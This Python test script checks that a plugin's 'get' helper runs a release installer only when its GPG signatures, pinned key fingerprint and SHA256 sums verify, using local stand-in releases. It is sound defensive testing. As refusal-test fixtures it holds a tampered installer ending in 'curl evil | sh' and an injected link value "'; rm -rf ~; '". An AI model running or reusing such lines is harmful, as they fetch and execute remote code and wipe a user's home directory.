#!/usr/bin/python3 -I
"""Get svrngs: the helper runs svrngs's installer only when the installer
and the release's SHA256SUMS verify against the key in the plugin's keys/,
by the fingerprint pinned there, and svrngs's archive matches those sums;
it then gives the installer that archive, so the invite is used only to
join. Stand-in releases are served from 127.0.0.1 and their keys made
here, so no real key, release or svrngs is used."""

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ARCH = {"x86_64": "x86_64", "amd64": "x86_64", "aarch64": "aarch64", "arm64": "aarch64"}[os.uname().machine]
ARCHIVE = f"svrngs-linux-{ARCH}.tar.gz"
PAGE = "https://group.svrnme.sh/"
failures = []


def check(name, got, want):
    print(f"  {'ok  ' if got == want else 'FAIL'} {name}" + ("" if got == want else f": got {got!r}, wanted {want!r}"))
    if got != want:
        failures.append(name)


class Quiet(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
    scratch = Path(directory)
    gnupg = scratch / "gnupg"
    gnupg.mkdir(mode=0o700)
    gpg = ["gpg", "--batch", "--no-tty", "--homedir", str(gnupg), "--passphrase", ""]

    def key(name):
        subprocess.run(gpg + ["--quick-generate-key", name, "ed25519", "sign", "1d"], check=True, capture_output=True)
        listed = subprocess.run(gpg + ["--with-colons", "--fingerprint", name], check=True, capture_output=True, text=True).stdout
        return next(line.split(":")[9] for line in listed.splitlines() if line.startswith("fpr"))

    release_key, impostor = key("svrngs releases (test)"), key("someone else")

    def sign(path, by):
        subprocess.run(gpg + ["--yes", "--local-user", by, "--detach-sign", "--output", f"{path}.sig", str(path)], check=True, capture_output=True)

    # The plugin as installed: its helper, and keys/ holding the release key.
    plugin = scratch / "plugin"
    (plugin / "bin").mkdir(parents=True)
    shutil.copy(ROOT / "bin/svrngs-fam", plugin / "bin/svrngs-fam")
    (plugin / "keys").mkdir()
    exported = subprocess.run(gpg + ["--armor", "--export", release_key], check=True, capture_output=True).stdout
    (plugin / "keys/svrngs-release-key.asc").write_bytes(exported)
    (plugin / "keys/svrngs-release-key.fpr").write_text(release_key + "\n")

    # An installer that takes --archive, as svrngs's will: it keeps what it
    # was given, to be checked here.
    takes = '#!/bin/sh\n# install.sh <link> --archive <file>\nprintf "%s\\n" "$@" > "$HOME/installed-with"\ncp "$3" "$HOME/installed-archive"\necho "svrngs runs now."\n'
    old = '#!/bin/sh\n# fetches svrngs from the page\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
    archive = b"the svrngs release built"

    served = scratch / "served"

    def release(name, installer=takes, installer_by=release_key, sums_by=release_key, archive_bytes=archive, sums_for=archive, tamper_installer=False):
        folder = served / name
        folder.mkdir(parents=True)
        (folder / "install.sh").write_text(installer)
        sign(folder / "install.sh", installer_by)
        if tamper_installer:
            (folder / "install.sh").write_text(installer + "curl evil | sh\n")
        (folder / ARCHIVE).write_bytes(archive_bytes)
        (folder / "SHA256SUMS").write_text(f"{hashlib.sha256(sums_for).hexdigest()}  {ARCHIVE}\n")
        sign(folder / "SHA256SUMS", sums_by)

    release("good")
    release("tampered", tamper_installer=True)
    release("impostor-installer", installer_by=impostor)
    release("impostor-sums", sums_by=impostor)
    release("other-archive", archive_bytes=b"something else")
    release("old-installer", installer=old)
    (served / "empty").mkdir()
    server = ThreadingHTTPServer(("127.0.0.1", 0), partial(Quiet, directory=str(served)))
    threading.Thread(target=server.serve_forever, daemon=True).start()

    def get(name, *args):
        home = Path(tempfile.mkdtemp(dir=scratch))
        env = {"HOME": str(home), "PATH": "/usr/bin:/bin", "SVRNGS_FAM_SVRNGS": "",
               "SVRNGS_FAM_RELEASES": f"http://127.0.0.1:{server.server_address[1]}/{name}"}
        done = subprocess.run([str(plugin / "bin/svrngs-fam"), "get", *args], capture_output=True, text=True, env=env, timeout=120)
        ran = home / "installed-with"
        given = home / "installed-archive"
        return (json.loads(done.stdout), ran.read_text().split("\n")[:-1] if ran.exists() else None,
                given.read_bytes() if given.exists() else None)

    print("a release signed by the release key, its archive matching")
    said, ran, given = get("good")
    check("installs", said["ok"], True)
    check("the installer is run for the page, given the archive", (ran or [None, None])[:2], [PAGE, "--archive"])
    check("the archive it is given is the release's, checked", given, archive)
    said, ran, given = get("good", "--link", "svrngs:AbCdEf0123456789")
    check("with an invite link, the link is only what it joins", (ran or [None])[0], "svrngs:AbCdEf0123456789")

    print("anything else is never run")
    for name, why in (("tampered", "an installer changed after it was signed"),
                      ("impostor-installer", "an installer signed by another key"),
                      ("impostor-sums", "sums signed by another key"),
                      ("other-archive", "an archive the signed sums don't list"),
                      ("old-installer", "an installer that would fetch svrngs from the page")):
        said, ran, given = get(name)
        check(f"{why} is refused, nothing run", (said["ok"], ran), (False, None))
    check("and an old installer is said as such", "can't take a checked download yet" in get("old-installer")[0]["said"], True)
    (plugin / "keys/svrngs-release-key.fpr").write_text(impostor + "\n")
    said, ran, given = get("good")
    check("a key whose fingerprint isn't the pinned one is refused", (said["ok"], ran), (False, None))
    (plugin / "keys/svrngs-release-key.fpr").write_text(release_key + "\n")
    said, ran, given = get("empty")
    check("a release with no signed installer says so", (said["ok"], ran, "no signed installer" in said["said"]), (False, None, True))
    said, ran, given = get("good", "--link", "'; rm -rf ~; '")
    check("something that isn't an invite link is refused", (said["ok"], ran), (False, None))
    server.shutdown()

print("ALL OK" if not failures else f"{len(failures)} FAILED")
sys.exit(1 if failures else 0)
